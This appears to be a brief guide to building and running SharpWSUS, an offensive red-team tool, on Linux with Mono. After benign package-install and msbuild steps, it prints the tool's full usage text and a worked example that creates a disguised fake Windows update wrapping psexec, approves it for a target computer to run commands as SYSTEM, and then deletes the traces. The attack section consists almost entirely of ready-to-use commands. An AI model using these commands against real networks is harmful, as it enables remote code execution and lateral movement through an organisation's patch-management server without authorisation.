A `.sln` file is a solution file used to organise and build C# and other .NET projects in Visual Studio.

```bash
sudo apt update
sudo apt install -y gnupg ca-certificates apt-transport-https

sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF
echo "deb https://download.mono-project.com/repo/ubuntu stable-focal main" | sudo tee /etc/apt/sources.list.d/mono-official-stable.list

sudo apt update
sudo apt install -y mono-complete msbuild mono-roslyn

cd /path/to/project
msbuild Project.sln /p:Configuration=Release
```

Mono is an open-source implementation of the .NET Framework that lets you run and build .NET applications on Linux and other non-Windows systems.


```bash
mono /opt/SharpWSUS/SharpWSUS/bin/Release/SharpWSUS.exe

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team


Commands listed below have optional parameters in <>. 

Locate the WSUS server:
    SharpWSUS.exe locate

Inspect the WSUS server, enumerating clients, servers and existing groups:
    SharpWSUS.exe inspect 

Create an update (NOTE: The payload has to be a windows signed binary):
    SharpWSUS.exe create /payload:[File location] /args:[Args for payload] </title:[Update title] /date:[YYYY-MM-DD] /kb:[KB on update] /rating:[Rating of update] /msrc:[MSRC] /description:[description] /url:[url]>

Approve an update:
    SharpWSUS.exe approve /updateid:[UpdateGUID] /computername:[Computer to target] </groupname:[Group for computer to be added too] /approver:[Name of approver]>

Check status of an update:
    SharpWSUS.exe check /updateid:[UpdateGUID] /computername:[Target FQDN]

Delete update and clean up groups added:
    SharpWSUS.exe delete /updateid:[UpdateGUID] /computername:[Target FQDN] </groupname:[GroupName] /keepgroup>

##### Examples ######
Executing whoami as SYSTEM on a remote machine:
    SharpWSUS.exe inspect
    SharpWSUS.exe create /payload:"C:\Users\Test\Documents\psexec.exe" /args:"-accepteula -s -d cmd.exe /c ""whoami > C:\test.txt""" /title:"Great Update" /date:2021-10-03 /kb:500123 /rating:Important /description:"Really important update" /url:"https://google.com"
    SharpWSUS.exe approve /updateid:93646c49-7d21-4576-9922-9cbcce9f8553 /computername:test1 /groupname:"Great Group"
    SharpWSUS.exe check /updateid:93646c49-7d21-4576-9922-9cbcce9f8553 /computername:test1
    SharpWSUS.exe delete /updateid:93646c49-7d21-4576-9922-9cbcce9f8553 /computername:test1 /groupname:"Great Group
```